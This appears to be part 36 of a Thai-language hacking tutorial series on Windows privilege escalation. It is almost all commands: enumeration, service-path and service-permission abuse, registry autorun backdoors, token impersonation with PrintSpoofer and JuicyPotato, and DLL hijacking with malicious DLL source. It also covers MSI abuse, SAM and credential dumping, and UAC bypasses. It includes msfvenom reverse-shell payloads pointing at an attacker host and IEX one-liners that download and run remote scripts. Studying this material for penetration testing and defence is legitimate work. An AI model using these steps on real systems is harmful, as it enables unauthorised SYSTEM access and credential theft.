# Part 36: Windows Privilege Escalation

## สารบัญ
1. [Windows PrivEsc Overview](#1-windows-privesc-overview)
2. [Unquoted Service Paths](#2-unquoted-service-paths)
3. [Weak Service Permissions](#3-weak-service-permissions)
4. [Registry Exploits](#4-registry-exploits)
5. [Token Impersonation](#5-token-impersonation)
6. [DLL Hijacking](#6-dll-hijacking)
7. [AlwaysInstallElevated](#7-alwaysinstallelevated)
8. [Stored Credentials](#8-stored-credentials)
9. [เครื่องมือ Automated](#9-เครื่องมือ-automated)
10. [สรุป](#10-สรุป)

---

## 1. Windows PrivEsc Overview

### Enumeration เบื้องต้น

```powershell
# ============================================
# ข้อมูลพื้นฐาน
# ============================================

# System info
systeminfo
# OS Name: Windows 10 Pro
# OS Version: 10.0.19044
# Hotfix(es): N°8 Hotfix(es) Installed.

# User info
whoami
whoami /priv       # privileges!
whoami /groups     # groups
net user           # all users
net user <username>  # user details
net localgroup administrators

# Environment
set
path

# Network
ipconfig /all
netstat -ano
route print
arp -a

# Processes
tasklist /v
get-process  # PowerShell

# Installed software
wmic product get name,version
Get-WmiObject -Class Win32_Product | Select Name,Version

# Patches
wmic qfe get Caption,Description,InstalledOn
Get-HotFix
```

### ค้นหา Sensitive Files

```powershell
# ============================================
# ค้นหา credentials ในไฟล์
# ============================================

# Common locations
dir C:\
dir C:\Users
dir C:\Windows\Temp
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Config files with passwords
dir /s /b C:\*.ini
dir /s /b C:\*.cfg
dir /s /b C:\*.xml | findstr /i password

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Unattend files (deployment)
dir /s /b C:\unattend.xml
dir /s /b C:\sysprep.inf
dir /s /b C:\sysprep.xml
# อาจมี plaintext passwords!

# Web server configs
type C:\inetpub\wwwroot\web.config
type C:\inetpub\wwwroot\*.config

# Find password strings
findstr /si password *.txt *.xml *.ini *.config
findstr /si password C:\*.* 2>nul
```

---

## 2. Unquoted Service Paths

### อธิบาย

```
Service path: C:\Program Files\My App\Service.exe

Windows ค้นหาในลำดับ:
1. C:\Program.exe
2. C:\Program Files\My.exe  <- ถ้าสร้างได้ จะรันแทน!
3. C:\Program Files\My App\Service.exe
```

```powershell
# ============================================
# หา unquoted service paths
# ============================================

# CMD
wmic service get name,pathname,displayname,startmode | 
findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v "\""

# PowerShell
Get-WmiObject -Class Win32_Service | 
  Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | 
  Select Name, PathName, StartMode

# ดูตัวอย่าง
sc qc "Vulnerable Service"
# BINARY_PATH_NAME: C:\Program Files\Vuln App\vuln.exe
# ไม่มีเครื่องหมาย quote!

# ตรวจสอบ writable directories
icacls "C:\\"
icacls "C:\Program Files"
# ถ้า BUILTIN\Users:(W) -> เขียนได้!

# ============================================
# Exploit
# ============================================

# Kali: สร้าง payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o Program.exe

# Upload ไป target
# Copy to exploit path
copy Program.exe "C:\Program Files\Program.exe"
# หรือ
copy Program.exe "C:\Program.exe"

# รัน service
sc start "Vulnerable Service"
# -> Windows ใช้ C:\Program.exe แทน!

# Metasploit module
use exploit/windows/local/trusted_service_path
set SESSION 1
run
```

---

## 3. Weak Service Permissions

```powershell
# ============================================
# ค้นหา services ที่เราแก้ไขได้
# ============================================

# Accesschk.exe (Sysinternals)
.\accesschk.exe /accepteula -uwcqv "Users" *
.\accesschk.exe /accepteula -uwcqv * 2>nul | findstr "SERVICE_ALL_ACCESS"

# PowerShell
$services = Get-WmiObject Win32_Service
foreach ($svc in $services) {
    $sddl = sc.exe sdshow $svc.Name 2>$null
    if ($sddl -match 'AU|BU') {
        Write-Host "Interesting: $($svc.Name)"
    }
}

# ============================================
# เมื่อเห็น vulnerable service
# ============================================

# ดู current config
sc qc "VulnService"
# BINARY_PATH_NAME: C:\VulnApp\service.exe
# SERVICE_START_NAME: LocalSystem

# แก้ไข binary path (change to our shell)
sc config VulnService binpath= "C:\Windows\Temp\shell.exe"
sc start VulnService

# หรือ
sc config VulnService binpath= "net localgroup administrators user /add"
sc start VulnService
net localgroup administrators

# Metasploit
use exploit/windows/local/service_permissions
set SESSION 1
set AGGRESSIVE true
run
```

---

## 4. Registry Exploits

### Registry Autorun

```powershell
# ============================================
# Autorun paths ที่เราเขียนได้
# ============================================

# ดูค่า autorun
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"

# Accesschk ตรวจสอบ permissions
.\accesschk.exe /accepteula "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# ถ้าเขียนได้:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
  /v Backdoor \
  /t REG_SZ \
  /d "C:\Windows\Temp\shell.exe" \
  /f
```

### Service Registry Permissions

```powershell
# ============================================
# Service registry ที่เขียนได้
# ============================================

# ตรวจสอบ
.\accesschk.exe /accepteula "HKLM\System\CurrentControlSet\Services"

# ถ้า service registry เขียนได้:
reg add HKLM\System\CurrentControlSet\Services\VulnService \
  /v ImagePath \
  /t REG_SZ \
  /d "C:\Windows\Temp\shell.exe" \
  /f
sc start VulnService
```

---

## 5. Token Impersonation

### Juicy Potato / PrintSpoofer

```powershell
# ============================================
# Token impersonation attacks
# เมื่อมี SeImpersonatePrivilege หรือ SeAssignPrimaryTokenPrivilege
# ============================================

# ตรวจสอบ privileges
whoami /priv
# Privilege Name               State
# SeImpersonatePrivilege       Enabled   <- vulnerable!
# SeAssignPrimaryTokenPrivilege Enabled  <- vulnerable!

# ============================================
# PrintSpoofer (Windows 10/Server 2016+)
# ============================================

# Download: https://github.com/itm4n/PrintSpoofer
PrintSpoofer.exe -i -c cmd
# [+] Found privilege: SeImpersonatePrivilege
# [+] Named pipe listening...
# [+] CreateProcessAsUser() OK
# C:\Windows\system32> whoami
# nt authority\system

# With payload:
PrintSpoofer.exe -c "C:\Windows\Temp\shell.exe"

# ============================================
# JuicyPotato (Windows 10 < 1809, Server < 2019)
# ============================================

# Download: https://github.com/ohpe/juicy-potato
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\shell.exe -t *
# Testing {xxx} xxxxx -> SUCCEEDED
# COM -> recv SYSTEM shell

# ถ้า default CLSID ไม่ทำงาน:
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\shell.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"

# ============================================
# RoguePotato (Windows 10 1809+)
# ============================================
RoguePotato.exe -r 192.168.1.50 -e "C:\Windows\Temp\shell.exe" -l 9999

# ============================================
# Metasploit
# ============================================
msf6 > use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 1
run
```

### Incognito Token Stealing

```bash
# ============================================
# Incognito - เอา token จาก processอื่น
# ============================================

meterpreter > use incognito
meterpreter > list_tokens -u
# Delegation Tokens Available:
# NT AUTHORITY\SYSTEM
# DOMAIN\Administrator
# DOMAIN\DA_User

meterpreter > impersonate_token "DOMAIN\\Administrator"
# [+] Delegation token available
# [+] Successfully impersonated user DOMAIN\Administrator
meterpreter > getuid
# Server username: DOMAIN\Administrator

meterpreter > getsystem  # ลอง getsystem
meterpreter > shell
C:\> whoami
DOMAIN\Administrator
```

---

## 6. DLL Hijacking

```powershell
# ============================================
# DLL Search Order:
# 1. Application directory
# 2. System32 (C:\Windows\System32)
# 3. System directory (C:\Windows\System)
# 4. Windows directory (C:\Windows)
# 5. Current directory
# 6. PATH directories
# ============================================

# ค้นหา DLL hijacking ด้วย Process Monitor
# Procmon.exe -> Filter: Result = NAME NOT FOUND
#                        Path ends with .dll
#                        Process name = target.exe

# PowerShell: ค้นหา writable directories ใน PATH
$env:PATH -split ';' | ForEach-Object {
    $dir = $_
    if (Test-Path $dir) {
        $acl = Get-Acl $dir
        if ($acl.AccessToString -match 'Users.*Allow.*Write') {
            Write-Host "WRITABLE: $dir"
        }
    }
}

# ============================================
# สร้าง malicious DLL (Kali)
# ============================================
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f dll -o evil.dll

# หรือ C code
cat > evil.c << 'EOF'
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // ใส่โค้ดที่ต้องการรันที่นี่
        system("cmd.exe /c C:\\Windows\\Temp\\shell.exe");
        break;
    }
    return TRUE;
}
EOF

x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c -lws2_32

# Copy ไปยังตำแหน่งที่ถูกค้นหาโดย app
copy evil.dll "C:\Program Files\VulnApp\missing.dll"
```

---

## 7. AlwaysInstallElevated

```powershell
# ============================================
# AlwaysInstallElevated - MSI files run as SYSTEM
# ============================================

# ตรวจสอบ registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1  <- vulnerable!

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1

# ถ้าทั้งสองเป็น 1 -> vulnerable!

# ============================================
# Exploit
# ============================================

# Kali: สร้าง malicious MSI
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f msi -o evil.msi

# Target:
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
# -> รันเป็น SYSTEM

# PowerShell
$msi = "C:\Windows\Temp\evil.msi"
$args = "/quiet /qn /i $msi"
Start-Process msiexec.exe -ArgumentList $args -Wait

# WinPEAS ตรวจสอบอัตโนมัติ
winpeas.exe quiet windowscreds
```

---

## 8. Stored Credentials

```powershell
# ============================================
# หา saved credentials
# ============================================

# Windows Credential Manager
cmdkey /list
# Currently stored credentials:
# Target: Domain:target=server01
# User: DOMAIN\admin
# Type: Domain Password

# ใช้ stored credentials
runas /savecred /user:DOMAIN\admin "C:\Windows\Temp\shell.exe"

# ============================================
# PowerShell credentials
# ============================================

# หา credentials ในไฟล์
Get-ChildItem -Recurse C:\Users -Filter *.xml -ErrorAction SilentlyContinue | 
  Select-String -Pattern "password|Pass|pwd" -CaseSensitive:$false

# แยก DPAPI encrypted
$xml = Import-CliXml -Path "C:\Users\user\creds.xml"
$xml.GetNetworkCredential().Password

# ============================================
# Registry searches
# ============================================
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

# Autologon credentials
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
# AutoAdminLogon: 1
# DefaultUserName: Administrator
# DefaultPassword: Password123  <- exposed!

# VNC password
reg query HKCU\Software\ORL\WinVNC3\Password
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password

# PuTTY saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# ============================================
# Pass ด้วย SAM + SYSTEM dump
# ============================================
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive

# Download แล้ว crack บน Kali
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931:::
```

---

## 9. เครื่องมือ Automated

### WinPEAS

```powershell
# ============================================
# WinPEAS - Windows Privilege Escalation
# ============================================

# Download:
# https://github.com/carlospolop/PEASS-ng/releases/latest

# รันบน target
.\winPEAS.exe
.\winPEAS.exe quiet  # ไม่แสดงเสียง
.\winPEAS.exe windowscreds  # เฉพาะ credentials

# ใน Meterpreter:
meterpreter > upload /tmp/winPEAS.exe C:\\Windows\\Temp\\winPEAS.exe
meterpreter > shell
C:\Windows\Temp\winPEAS.exe > C:\Windows\Temp\out.txt
type C:\Windows\Temp\out.txt

# Metasploit module
meterpreter > run post/multi/recon/local_exploit_suggester
# [+] exploit/windows/local/ms17_010_psexec
# [+] exploit/windows/local/tokenmagic
# [+] exploit/windows/local/bypassuac_eventvwr

# ============================================
# PowerSploit/PowerUp
# ============================================

# Download
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/PowerUp.ps1')

# รัน all checks
Invoke-AllChecks
# [*] Checking for vulnerable service permissions...
# [*] Checking for unquoted service paths...
# [*] Checking for AlwaysInstallElevated...

# ============================================
# Sherlock (PoC for legacy Windows)
# ============================================
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/Sherlock.ps1')
Find-AllVulns
```

### UAC Bypass

```powershell
# ============================================
# Bypass UAC เพื่อเป็น High Integrity
# ============================================

# ตรวจสอบ integrity level ปัจจุบัน
whoami /groups | findstr "Mandatory"
# ถ้า Medium Mandatory Level -> ต้อง bypass UAC
# ถ้า High Mandatory Level -> อยู่แล้ว

# Method 1: Fodhelper UAC bypass
New-Item "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "(default)" \
  -Value "C:\Windows\Temp\shell.exe" -Force
New-ItemProperty -Path "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "DelegateExecute" -Value "" -Force
Start-Process fodhelper.exe

# Method 2: eventvwr bypass
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" \
  -Name '(default)' -Value 'C:\Windows\Temp\shell.exe' -Force
Start-Process eventvwr.exe

# Method 3: Metasploit
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
run

# Method 4: via meterpreter
meterpreter > run post/windows/escalate/getsystem
meterpreter > getsystem  # ลองหลาย techniques
```

---

## 10. สรุป

### Summary Table

| เทคนิค | วิธีตรวจสอบ |
|---------|----------|
| Unquoted Service | wmic service get, accesschk |
| Weak Service | accesschk, sc qc |
| Registry | reg query autorun paths |
| Token | whoami /priv -> SeImpersonate |
| DLL Hijack | procmon, writable PATH dirs |
| AlwaysInstallElevated | reg query two keys |
| Saved Creds | cmdkey, reg query winlogon |
| UAC Bypass | fodhelper, eventvwr, metasploit |
| Automation | WinPEAS, PowerUp, local_exploit_suggester |

### Checklist

```
[ ] whoami /priv (ดู SeImpersonate)
[ ] systeminfo และดู patches
[ ] Unquoted service paths
[ ] Weak service permissions (accesschk)
[ ] AlwaysInstallElevated registry
[ ] Stored credentials (cmdkey)
[ ] Autorun registry entries
[ ] DLL hijacking opportunities
[ ] WinPEAS run
[ ] local_exploit_suggester
```

---

**ต่อไป**: [Part 37 - Password Attacks with Hashcat and John the Ripper](Part-37-Password-Attacks.md)
